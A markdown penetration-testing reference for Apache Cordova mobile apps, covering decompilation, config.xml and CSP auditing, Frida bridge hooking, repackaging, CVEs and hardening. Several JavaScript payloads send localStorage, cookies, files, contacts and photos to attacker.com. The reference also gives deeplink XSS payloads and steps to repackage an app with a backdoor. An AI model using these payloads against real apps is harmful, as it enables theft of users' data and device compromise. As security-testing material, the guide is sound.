# 📱 Cordova Apps — Mobile Penetration Testing

> A complete Red Team reference for **Apache Cordova** hybrid mobile application security testing. Covers APK/IPA extraction, source code analysis, WebView security, config.xml auditing, CSP bypass, plugin vulnerabilities, Frida hooks, deeplink attacks, debug mode exploitation, and real-world CVEs.

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Android%20%7C%20iOS-brightgreen?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Framework-Apache_Cordova-E8A020?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/MITRE-T1456%20%7C%20T1417%20%7C%20T1623-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/OWASP_Mobile-Top_10-blue?style=for-the-badge"/>
</p>

---

## Table of Contents

- [Overview — What Is Cordova](#overview--what-is-cordova)
- [How Cordova Works (Attack Surface)](#how-cordova-works-attack-surface)
- [Setup — Tools & Prerequisites](#setup--tools--prerequisites)
- [Phase 1 — APK/IPA Extraction & Decompilation](#phase-1--apkipa-extraction--decompilation)
- [Phase 2 — Detect Cordova App](#phase-2--detect-cordova-app)
- [Phase 3 — config.xml Analysis](#phase-3--configxml-analysis)
- [Phase 4 — Source Code Analysis (www/)](#phase-4--source-code-analysis-www)
- [Phase 5 — AndroidManifest.xml & Info.plist](#phase-5--androidmanifestxml--infoplist)
- [Phase 6 — Plugin Vulnerability Assessment](#phase-6--plugin-vulnerability-assessment)
- [Phase 7 — CSP (Content Security Policy) Testing](#phase-7--csp-content-security-policy-testing)
- [Phase 8 — WebView Debug Exploitation](#phase-8--webview-debug-exploitation)
- [Phase 9 — Whitelist Bypass](#phase-9--whitelist-bypass)
- [Phase 10 — XSS in WebView (Full Code Execution)](#phase-10--xss-in-webview-full-code-execution)
- [Phase 11 — Deeplink Attacks](#phase-11--deeplink-attacks)
- [Phase 12 — JavaScript Bridge Hooking (Frida)](#phase-12--javascript-bridge-hooking-frida)
- [Phase 13 — Code Tampering & Repackaging](#phase-13--code-tampering--repackaging)
- [Phase 14 — Insecure Data Storage](#phase-14--insecure-data-storage)
- [Phase 15 — Network Traffic Analysis](#phase-15--network-traffic-analysis)
- [Tools Reference](#tools-reference)
- [References](#references)

---

## Overview — What Is Cordova

**Apache Cordova** (formerly PhoneGap) is an open-source framework for building **hybrid mobile apps** using HTML, CSS, and JavaScript. The web content runs inside a **WebView** with access to native device APIs through a **JavaScript bridge**.

### Cordova vs React Native (Security Perspective)

| Feature | Cordova | React Native |
|---|---|---|
| Source code in APK/IPA | ✅ Readable HTML/JS | ⚠️ Compiled JS bundle |
| WebView-based | ✅ Yes | ❌ Custom JS VM |
| Code tampering risk | 🔴 High — trivial to modify | 🟡 Medium |
| XSS → Code execution | 🔴 Direct | ❌ Sandboxed |
| Default source protection | ❌ None | ⚠️ Partial |

---

## How Cordova Works (Attack Surface)

```
User Interaction
      │
      ▼
WebView (HTML/CSS/JavaScript)
      │
      │  JavaScript Bridge (cordova.exec())
      ▼
Native Plugin Layer (Java / Swift / Obj-C)
      │
      ▼
Device APIs (Camera, Contacts, Filesystem, GPS, etc.)

Attack Surface:
  ├── www/          ← All app source code (readable in APK)
  ├── config.xml    ← Whitelist, permissions, plugin config
  ├── plugins/      ← Third-party plugins (npm packages)
  ├── WebView       ← XSS = full app context code execution
  ├── Deeplinks     ← Unvalidated input → XSS/RCE
  └── JS Bridge     ← Hooking cordova.exec() leaks all calls
```

---

## Setup — Tools & Prerequisites

```bash
# Android tooling
apt install adb apktool jadx dex2jar -y
pip install frida-tools

# Node / Cordova
npm install -g cordova

# iOS tooling
brew install ios-deploy ideviceinstaller libimobiledevice

# Additional tools
pip install objection
npm install -g @microsoft/rush   # For npm audit workflows
```

---

## Phase 1 — APK/IPA Extraction & Decompilation

### Android — Extract APK

```bash
# List installed packages
adb shell pm list packages | grep -i "target_app"

# Get APK path
adb shell pm path com.target.app

# Pull APK from device
adb pull /data/app/com.target.app-1/base.apk ./target.apk

# Decompile with apktool (recovers config.xml, www/, AndroidManifest.xml)
apktool d target.apk -o target_decompiled/

# Full Java decompile with jadx
jadx -d target_jadx/ target.apk

# Alternative: unzip directly (Cordova assets are unencrypted)
unzip -q target.apk -d target_unzipped/
ls target_unzipped/assets/www/
```

### iOS — Extract IPA

```bash
# From device (jailbroken) or App Store download
# Decrypt and extract IPA
frida-ios-dump -u <UDID> -p <BUNDLE_ID> -o app.ipa

# Unzip IPA
unzip -q app.ipa -d app_extracted/
ls app_extracted/Payload/*.app/www/

# iOS config file location
ls app_extracted/Payload/App.app/config.xml
ls app_extracted/Payload/App.app/www/
```

---

## Phase 2 — Detect Cordova App

### Confirm It Is a Cordova App

```bash
# Check for Cordova signature files
ls target_decompiled/assets/www/
# Look for: cordova.js, cordova_plugins.js, config.xml, index.html

# Check AndroidManifest for CordovaActivity
grep -i "CordovaActivity\|cordova" target_decompiled/AndroidManifest.xml

# Check for cordova version in JS files
grep -r "CORDOVA_VERSION\|cordova.version" target_decompiled/assets/www/

# Check config.xml
cat target_decompiled/assets/www/config.xml
# or
cat target_decompiled/res/xml/config.xml
```

### Cordova File Structure (in APK)

```
assets/www/
  ├── index.html          ← App entry point
  ├── cordova.js          ← Cordova core
  ├── cordova_plugins.js  ← Plugin registry
  ├── config.xml          ← App config (whitelist, access rules)
  ├── js/                 ← Application JavaScript
  ├── css/                ← Stylesheets
  └── plugins/            ← Plugin JS implementations
```

---

## Phase 3 — config.xml Analysis

> `config.xml` is the most critical file. It defines the whitelist, permissions, access rules, and plugin configurations.

### Extract config.xml

```bash
# Android
cat target_decompiled/assets/www/config.xml
cat target_decompiled/res/xml/config.xml

# iOS
cat app_extracted/Payload/App.app/config.xml
```

### High-Risk Patterns to Find

```bash
# Wildcard access — allows ALL domains (critical)
grep -n "access origin" config.xml

# Navigation whitelist — allows navigating to any URL
grep -n "allow-navigation" config.xml

# Intent whitelist (Android)
grep -n "allow-intent" config.xml

# Hardcoded secrets / API keys
grep -Ei "api_key|secret|password|token|key=" config.xml
```

### Vulnerable config.xml Patterns

```xml
<!-- ❌ CRITICAL: Wildcard access — all domains allowed -->
<access origin="*" />

<!-- ❌ HIGH: Allows navigation to any URL -->
<allow-navigation href="*" />

<!-- ❌ HIGH: Allows any intent -->
<allow-intent href="*" />

<!-- ❌ MEDIUM: Debug mode enabled -->
<preference name="android-debuggable" value="true" />

<!-- ❌ MEDIUM: Allows cleartext HTTP -->
<preference name="android-cleartext-traffic" value="true" />

<!-- ❌ MEDIUM: Allows all intents -->
<allow-intent href="market:*" />
<allow-intent href="geo:*" />
```

### Secure config.xml (Reference)

```xml
<!-- ✅ Restrict access to specific domains only -->
<access origin="https://api.myapp.com" />

<!-- ✅ Restrict navigation -->
<allow-navigation href="https://myapp.com/*" />

<!-- ✅ Disable cleartext -->
<preference name="android-usesCleartextTraffic" value="false" />
```

---

## Phase 4 — Source Code Analysis (www/)

### Grep for Dangerous Patterns

```bash
cd target_decompiled/assets/www/

# eval() usage — XSS amplifier
grep -rn "eval(" . --include="*.js"

# new Function() — dynamic code execution
grep -rn "new Function(" . --include="*.js"

# innerHTML assignment — DOM XSS sink
grep -rn "innerHTML" . --include="*.js"
grep -rn "document.write(" . --include="*.js"
grep -rn "outerHTML" . --include="*.js"

# Hardcoded secrets
grep -rEi "api[_-]?key|secret|password|token|bearer|private.key" . --include="*.js"
grep -rEi "aws_access|client_secret|api_secret" . --include="*.js"

# Hardcoded URLs / endpoints
grep -rn "http://" . --include="*.js"
grep -rn "https://" . --include="*.js"

# localStorage sensitive data
grep -rn "localStorage.setItem" . --include="*.js"

# Cleartext storage
grep -rn "localStorage\|sessionStorage\|indexedDB" . --include="*.js"

# WebSQL (deprecated, insecure)
grep -rn "openDatabase\|executeSql" . --include="*.js"

# cordova.exec calls — bridge usage
grep -rn "cordova.exec" . --include="*.js"

# Insecure random
grep -rn "Math.random()" . --include="*.js"
```

### Find All Endpoints

```bash
# Extract all URLs
grep -roEh "https?://[a-zA-Z0-9._/-]+" . --include="*.js" | sort -u

# Extract all API endpoints
grep -roEh '"/api/[a-zA-Z0-9/_-]+"' . --include="*.js" | sort -u
```

---

## Phase 5 — AndroidManifest.xml & Info.plist

### Android — Key Checks

```bash
cat target_decompiled/AndroidManifest.xml
```

```bash
# Check for debuggable flag (CRITICAL)
grep -n "debuggable" target_decompiled/AndroidManifest.xml
# android:debuggable="true" → exposes WebView to chrome://inspect → full JS injection

# Check for backup allowed (data theft risk)
grep -n "allowBackup" target_decompiled/AndroidManifest.xml
# android:allowBackup="true" → attacker can pull all app data with adb backup

# Check for cleartext traffic
grep -n "usesCleartextTraffic" target_decompiled/AndroidManifest.xml

# Exported components (attack surface)
grep -n 'exported="true"' target_decompiled/AndroidManifest.xml

# Permissions
grep -n "uses-permission" target_decompiled/AndroidManifest.xml

# Network security config
grep -n "networkSecurityConfig" target_decompiled/AndroidManifest.xml

# Target SDK (must be 34+ for 2024 Play Store)
grep -n "targetSdkVersion\|targetSdk" target_decompiled/AndroidManifest.xml
```

### iOS — Info.plist Key Checks

```bash
cat app_extracted/Payload/App.app/Info.plist

# Allows arbitrary loads (HTTP allowed — insecure)
grep -A2 "NSAllowsArbitraryLoads" Info.plist

# App Transport Security exceptions
grep -A10 "NSAppTransportSecurity" Info.plist

# URL schemes (deeplink handlers)
grep -A5 "CFBundleURLSchemes" Info.plist

# Permissions
grep -i "NSCamera\|NSMicrophone\|NSLocation\|NSContacts" Info.plist
```

---

## Phase 6 — Plugin Vulnerability Assessment

### List All Installed Plugins

```bash
# From decompiled APK
cat target_decompiled/assets/www/cordova_plugins.js | grep "\"id\""

# From package.json (if available)
cat package.json | grep "cordova-plugin"

# Plugins directory
ls target_decompiled/assets/www/plugins/

# All plugin IDs
grep -r "\"id\":" target_decompiled/assets/www/cordova_plugins.js | awk -F'"' '{print $4}'
```

### Audit Plugins for Known CVEs

```bash
# If you have the source repo
npm audit --production

# OSV Scanner
osv-scanner --lockfile package-lock.json

# cordova-check-plugins
npm install -g cordova-check-plugins
cordova-check-plugins

# Check for malicious packages
npm audit --json | python3 -m json.tool
```

### Dangerous Plugins to Scrutinize

| Plugin | Risk | Attack Vector |
|---|---|---|
| `cordova-plugin-file` | High | File read/write access via XSS |
| `cordova-plugin-camera` | Medium | Privacy — unauthorized camera access |
| `cordova-plugin-contacts` | High | Privacy — full contacts exfiltration |
| `cordova-plugin-geolocation` | Medium | Privacy — location tracking |
| `cordova-plugin-inappbrowser` | High | Deeplink XSS, JS injection |
| `cordova-plugin-sqlite` | Medium | SQLi via unvalidated input |
| `cordova-plugin-whitelist` | Critical | Misconfigured → all domain access |
| `cordova-plugin-network-information` | Low | Info disclosure |

---

## Phase 7 — CSP (Content Security Policy) Testing

### Extract CSP from index.html

```bash
cat target_decompiled/assets/www/index.html | grep -i "content-security-policy"
```

### Vulnerable CSP Patterns

```html
<!-- ❌ CRITICAL: No CSP at all -->
<html>
  <head><!-- no CSP meta tag --></head>

<!-- ❌ HIGH: unsafe-inline allows script injection -->
<meta http-equiv="Content-Security-Policy"
  content="default-src *; script-src * 'unsafe-inline' 'unsafe-eval'">

<!-- ❌ HIGH: unsafe-eval allows eval() -->
<meta http-equiv="Content-Security-Policy"
  content="script-src 'self' 'unsafe-eval'">

<!-- ❌ MEDIUM: Wildcard connect-src (WebSocket bypass) -->
<meta http-equiv="Content-Security-Policy"
  content="connect-src * ws: wss:">

<!-- ❌ MEDIUM: Wildcard img-src (data exfiltration) -->
<meta http-equiv="Content-Security-Policy"
  content="img-src *">
```

### Secure CSP (Reference)

```html
<!-- ✅ Strict CSP -->
<meta http-equiv="Content-Security-Policy"
  content="
    default-src 'none';
    script-src 'self';
    style-src 'self';
    img-src 'self' data:;
    connect-src https://api.myapp.com wss://realtime.myapp.com;
    font-src 'self';
    frame-src 'none';
    object-src 'none'
  ">
```

> **Note:** CSP is especially critical because the whitelist plugin does NOT apply to WebSocket connections (`ws:`/`wss:`) or the HTML5 `<video>` tag — these bypass the whitelist entirely.

---

## Phase 8 — WebView Debug Exploitation

> If `android:debuggable="true"` is set in `AndroidManifest.xml`, the WebView is exposed via Chrome DevTools — allowing full JS execution in app context.

### Enable Chrome Remote Debugging

```
1. Connect device via USB
2. Enable USB Debugging on device
3. Open Chrome browser on desktop
4. Navigate to: chrome://inspect/#devices
5. Find the app's WebView → Click "inspect"
6. Opens DevTools with full access to app context
```

### Exploit Debug Access

```javascript
// In Chrome DevTools Console — execute as the app:

// Read localStorage
Object.keys(localStorage).forEach(k => console.log(k, localStorage[k]));

// Read sessionStorage
Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage[k]));

// Steal all cookies
document.cookie;

// Exfiltrate data via XHR
fetch('https://attacker.com/?data=' + btoa(JSON.stringify(localStorage)));

// Access Cordova bridge directly
cordova.exec(
  function(result){ console.log(result); },
  function(err){ console.error(err); },
  "File", "readAsText", ["/sdcard/"]
);

// Hook all cordova.exec calls
var orig = cordova.exec;
cordova.exec = function(s,e,svc,act,args){
  console.log("[HOOK] svc=" + svc + " act=" + act + " args=" + JSON.stringify(args));
  return orig.apply(this, arguments);
};
```

### Check Programmatic Debug Enablement

```bash
# Search for WebContentsDebuggingEnabled in Java code
grep -r "setWebContentsDebuggingEnabled" target_jadx/
# If: setWebContentsDebuggingEnabled(true) → debug exposed regardless of manifest
```

---

## Phase 9 — Whitelist Bypass

> The `cordova-plugin-whitelist` has historically had bypass vulnerabilities. Even correctly configured whitelists can be circumvented.

### Test Cases

```javascript
// Test if wildcard is set
// Inspect config.xml: <access origin="*" />

// If whitelist is bypassed:
// Load external malicious content
var iframe = document.createElement('iframe');
iframe.src = 'https://attacker.com/evil.html';
document.body.appendChild(iframe);

// WebSocket bypass (whitelist doesn't apply)
var ws = new WebSocket('ws://attacker.com:4444');
ws.onopen = function() {
    ws.send(JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage)
    }));
};

// video tag bypass (whitelist doesn't apply)
var v = document.createElement('video');
v.src = 'http://attacker.com/track.mp4';
document.body.appendChild(v);
```

---

## Phase 10 — XSS in WebView (Full Code Execution)

> In Cordova, XSS in the WebView = **full app context code execution**. The impact depends on loaded plugins — file access, camera, contacts, etc.

### XSS → File Read (via cordova-plugin-file)

```javascript
// If XSS is achieved and cordova-plugin-file is loaded:
// Read sensitive files

window.resolveLocalFileSystemURL(
  cordova.file.dataDirectory,
  function(dir) {
    var reader = dir.createReader();
    reader.readEntries(function(entries) {
      entries.forEach(function(e) { console.log(e.name); });
    });
  }
);

// Read a specific file
window.resolveLocalFileSystemURL(
  cordova.file.dataDirectory + 'user_data.json',
  function(fileEntry) {
    fileEntry.file(function(file) {
      var reader = new FileReader();
      reader.onloadend = function() {
        fetch('https://attacker.com/?d=' + btoa(this.result));
      };
      reader.readAsText(file);
    });
  }
);
```

### XSS → Contacts Exfiltration (via cordova-plugin-contacts)

```javascript
// If cordova-plugin-contacts is loaded:
navigator.contacts.find(
  ['name', 'phoneNumbers', 'emails'],
  function(contacts) {
    fetch('https://attacker.com/?contacts=' + btoa(JSON.stringify(contacts)));
  },
  function(err) { console.error(err); },
  { multiple: true }
);
```

### XSS → Camera Access (via cordova-plugin-camera)

```javascript
// If cordova-plugin-camera is loaded:
navigator.camera.getPicture(
  function(imageData) {
    fetch('https://attacker.com/', {
      method: 'POST',
      body: JSON.stringify({ photo: imageData })
    });
  },
  function(err) { console.error(err); },
  { quality: 50, destinationType: Camera.DestinationType.DATA_URL }
);
```

---

## Phase 11 — Deeplink Attacks

> Deeplinks allow external apps/links to open the Cordova app with parameters. Unvalidated deeplink input passed to the WebView can trigger XSS or RCE.

### Identify Deeplink Schemes

```bash
# Android — check Intent filters in manifest
grep -A10 "intent-filter" target_decompiled/AndroidManifest.xml | grep -i "scheme\|host\|data"

# iOS — check URL schemes
grep -A5 "CFBundleURLSchemes" app_extracted/Payload/App.app/Info.plist
```

### Test Deeplink XSS (CVE-2023-2507 Pattern)

```bash
# Craft malicious deeplink
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://open?page=<script>alert(document.domain)</script>"

# URL-encoded payload
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://open?redirect=javascript:fetch('https://attacker.com/?c='+document.cookie)"

# Via browser link
# <a href="myapp://open?q=<img src=x onerror=alert(1)>">Click</a>
```

### Test Deeplink with Frida

```javascript
// Intercept deeplink handling
Java.perform(function() {
    var Activity = Java.use('android.app.Activity');
    Activity.onNewIntent.implementation = function(intent) {
        console.log('[DEEPLINK] Intent: ' + intent.getDataString());
        this.onNewIntent(intent);
    };
});
```

---

## Phase 12 — JavaScript Bridge Hooking (Frida)

> The Cordova JavaScript bridge (`cordova.exec()`) is the key interface between JS and native code. Hooking it reveals all plugin calls, arguments, and responses.

### Hook cordova.exec() via Frida

```javascript
// frida_hook_cordova.js
Java.perform(function() {
    // Hook the native execute method
    var CordovaPlugin = Java.use('org.apache.cordova.CordovaPlugin');

    CordovaPlugin.execute.implementation = function(action, args, callbackContext) {
        console.log('[CORDOVA BRIDGE]');
        console.log('  Plugin:  ' + this.$className);
        console.log('  Action:  ' + action);
        console.log('  Args:    ' + args.toString());
        var result = this.execute(action, args, callbackContext);
        return result;
    };
});
```

```bash
# Inject Frida script
frida -U -n "com.target.app" -l frida_hook_cordova.js

# Spawn and hook from start
frida -U -f "com.target.app" -l frida_hook_cordova.js --no-pause
```

### Hook from JavaScript (if debug access available)

```javascript
// In Chrome DevTools console
var _exec = cordova.exec;
cordova.exec = function(success, error, service, action, args) {
    console.log('[BRIDGE] ' + service + '.' + action, JSON.stringify(args));
    return _exec.apply(this, arguments);
};
```

### Using Objection (Automated Frida)

```bash
# Launch with objection
objection -g com.target.app explore

# List all classes
android hooking list classes | grep -i cordova

# Hook a specific plugin
android hooking watch class_method org.apache.cordova.file.FileUtils.execute --dump-args --dump-return
```

---

## Phase 13 — Code Tampering & Repackaging

> Since Cordova source is readable HTML/JS, an attacker can modify it and repackage the APK — bypassing integrity checks or creating a malicious lookalike.

### Modify Source Code

```bash
# 1. Decompile APK
apktool d target.apk -o modified/

# 2. Edit www/ source code
nano modified/assets/www/js/app.js
# Example: Add credential harvester, disable SSL pinning, add backdoor

# 3. Recompile
apktool b modified/ -o modified_repackaged.apk

# 4. Sign the APK
keytool -genkey -v -keystore attacker.keystore \
  -alias attacker -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore attacker.keystore modified_repackaged.apk attacker

# 5. Verify
apksigner verify modified_repackaged.apk

# 6. Install
adb install modified_repackaged.apk
```

### Bypass Integrity Detection

If the app has root/integrity detection:

```bash
# Create fresh Cordova app and copy source
cordova create bypass com.target.app TargetApp
cd bypass

# Copy original www/ content
cp -r /path/to/original/www/ ./www/

# Build with your own signing key
cordova build android
```

---

## Phase 14 — Insecure Data Storage

### Check localStorage / sessionStorage

```javascript
// In Chrome DevTools or XSS payload
console.log(JSON.stringify(localStorage));
console.log(JSON.stringify(sessionStorage));
```

### Check SQLite Databases (via ADB)

```bash
# Pull databases from device (root required)
adb shell
run-as com.target.app
ls /data/data/com.target.app/databases/

# Pull database
adb exec-out run-as com.target.app cat /data/data/com.target.app/databases/myapp.db > myapp.db

# Query with sqlite3
sqlite3 myapp.db ".tables"
sqlite3 myapp.db "SELECT * FROM users;"
```

### Check Shared Preferences (Android)

```bash
# Pull preferences XML
adb exec-out run-as com.target.app \
  cat /data/data/com.target.app/shared_prefs/com.target.app.xml
```

### Check Files Directory

```bash
# List all stored files
adb exec-out run-as com.target.app \
  find /data/data/com.target.app/ -type f 2>/dev/null
```

---

## Phase 15 — Network Traffic Analysis

### Proxy via Burp Suite (Android)

```bash
# Set Burp as proxy (device WiFi settings)
# IP: attacker machine IP, Port: 8080

# Install Burp CA cert on device
adb push burp_cert.der /sdcard/
# Settings → Security → Install certificate

# Force traffic through proxy (even SSL pinned)
# Use Objection to bypass SSL pinning
objection -g com.target.app explore
android sslpinning disable

# Frida SSL bypass
frida -U -f com.target.app \
  -l /path/to/frida-scripts/universal-android-ssl-pinning-bypass.js --no-pause
```

### Check for Cleartext Traffic

```bash
# Look for http:// in source
grep -rn "http://" target_decompiled/assets/www/ --include="*.js"

# Check network security config
cat target_decompiled/res/xml/network_security_config.xml
```

---

## Notable CVEs

| CVE / ID | Affected | Description | CVSS |
|---|---|---|---|
| **CVE-2023-2507** | CleverTap Cordova Plugin ≤ 2.6.2 | Unvalidated deeplink input → XSS in WebView context | High |
| **MAL-2024-7845** | cordova-plugin-acuant (July 2024) | Malicious code injected during npm install — dev machine compromise | Critical |
| **CVE-2022-22206** | Apache Cordova iOS < 6.2.0 | WKWebView policy bypass → cross-origin data access | High |
| **CVE-2015-5208** | cordova-plugin-whitelist < 1.2.0 | Whitelist bypass allowing arbitrary navigation | High |
| **CVE-2015-1835** | Apache Cordova Android 4.x | Remote attacker can set application preferences via malicious app | High |
| **CVE-2014-3502** | Apache Cordova Android < 3.5.1 | Intent URL scheme allows stealing login tokens | Medium |

---

## Mitigations

### config.xml Hardening

```xml
<!-- Restrict access to specific domains -->
<access origin="https://api.myapp.com" />

<!-- Restrict navigation -->
<allow-navigation href="https://myapp.com/*" />

<!-- Disable cleartext -->
<preference name="android-usesCleartextTraffic" value="false" />
```

### AndroidManifest.xml Hardening

```xml
<!-- Disable debug -->
<application android:debuggable="false" ... >

<!-- Disable backup -->
<application android:allowBackup="false" ... >

<!-- Target API 34+ -->
<uses-sdk android:targetSdkVersion="34" />

<!-- Network security config -->
<application android:networkSecurityConfig="@xml/network_security_config" >
```

### CSP Hardening

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'self'; connect-src https://api.myapp.com">
```

### Development Best Practices

```bash
# Pin plugin versions
npm ci  # Uses exact versions from package-lock.json

# Regular audits
npm audit --production
osv-scanner --lockfile package-lock.json
cordova-check-plugins

# Obfuscate JavaScript (slow down reversing)
npx terser www/js/app.js -o www/js/app.min.js

# Remove source maps from production
# Delete any *.map files before building

# Update to latest platform
cordova platform update android@13
```

---

## Tools Reference

| Tool | Purpose |
|---|---|
| **apktool** | Decompile / recompile APK |
| **jadx** | Decompile APK to Java source |
| **adb** | Android device bridge |
| **Frida** | Dynamic instrumentation — hook JS bridge, bypass SSL |
| **Objection** | Automated Frida scripts — SSL pinning, root bypass |
| **Burp Suite** | Intercept/modify HTTP/HTTPS traffic |
| **npm audit** | Check npm packages for known CVEs |
| **osv-scanner** | Open Source Vulnerabilities scanner for lockfiles |
| **cordova-check-plugins** | Check Cordova plugins for updates/CVEs |
| **Chrome DevTools** | Remote debug exposed WebViews |
| **MobSF** | Automated static + dynamic analysis |

---

## References

- HackTricks — Cordova Apps
- OWASP Mobile Security Testing Guide (MSTG)
- OWASP Mobile Top 10
- Apache Cordova Security Documentation
- CVE-2023-2507 — CleverTap Cordova Plugin deeplink XSS
- OSV-ID MAL-2024-7845 — Malicious cordova-plugin-acuant
- Securitum Research — Cordova XSS → Full Filesystem Access
- Payatu Research — Effortless Pentesting of Apache Cordova Applications
- cordova-android@13.0.0 Release Notes (May 2024)
